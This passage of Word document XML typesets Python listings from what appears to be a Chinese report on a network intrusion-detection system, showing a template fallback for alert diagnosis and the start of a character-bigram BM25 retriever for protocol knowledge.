        <w:t xml:space="preserve">        if not isinstance(item, dict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E0F4747">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D2925E4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if item.get("detail"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2094A6ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ev.append(str(item["detail"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C40DEA9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6401D4F6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ev.append(f"{item.get('feature')} = {item.get('value')}（偏离 {item.get('z_score')} 个标准差）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C3C9EB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C3048CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if by_rule:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D3BB06">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        verdict = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E160308">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"阈值规则判定为 {category}，实测值超出阈值 "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="686028F5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"{float(alert.get('confidence', 0)):.2f} 倍（规则不输出概率）。"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BC5D901">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743B0E9D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45AE9757">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        verdict = f"小模型判定为 {category}，置信度 {float(alert.get('confidence', 0)):.1%}。"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55501441">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return Diagnosis(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F6D9CD4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        summary=(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B53387D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"探针 {alert.get('probe_id', '?')} 上报的流被{verdict}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60F036A6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "本报告由模板生成：大模型接口当前不可用，未经过模型润色。"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51DCB6EC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DF9CAC7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        risk=risk if risk in ("info", "low", "medium", "high", "critical") else "medium",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F024C70">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        evidence=ev or ["（无特征证据）"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6119A9FB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        actions=["先确认该源 IP 的资产归属与用途，再决定是否在边界设备做临时封禁。"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6443CA2E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        principle="（大模型不可用，未生成协议原理回顾。请参考 docs/ 中的协议说明。）",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="625268DF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        category=category,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60088E46">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        confidence=float(alert.get("confidence", 0.0)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A79F258">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F04CCA">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="062BB392">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-23　llm/rag.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（81 行）　M9 字符二元组 BM25 检索</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04251085">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""M9 协议知识检索：给诊断提示词补上"这类攻击在协议层是怎么回事"。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA5348F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="393ABE42">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>为什么用字符二元组 BM25 而不是向量库：知识库只有十几条、全是本项目的专业中文段落，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67288CCB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>查询词也是固定的类别名加特征名。这种规模下向量检索并不比词面检索好，却要多装 torch、</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B41159F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>多下一个模型、多一个失效点。接口保持一致（retrieve(query, top_k)），要换向量库时</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D4DA25E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>只改这一个文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C520799">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E2986F1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>中文没有空格，按字切会把"端口扫描"切成四个没有意义的单字，所以用字符二元组。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1213BE39">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D594E8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5257B9AA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2C891D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="781A6B12">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396ECE7B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import math</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743C0E56">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import re</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AEB3724">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from collections import Counter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66453F22">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E49435">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D3E7B13">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ASCII_WORD = re.compile(r"[a-z0-9][a-z0-9\-_.]*")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09521B2B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>CJK = re.compile(r"[一-鿿]+")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5F59A7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F5BA8FE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B1A680A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def tokenize(text: str) -&gt; list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CF5E86A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    text = text.lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16892F3C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    tokens = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="231CCD32">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for run in CJK.findall(text):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2329D544">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        tokens.extend(run[i : i + 2] for i in range(len(run) - 1))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB12DD9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if len(run) == 1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70667509">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            tokens.append(run)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0F019A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    tokens.extend(ASCII_WORD.findall(text))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29125C65">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return tokens</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F669B22">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C6ED195">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1607220A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class Retriever:</w:t>
      </w:r>
    </w:p>
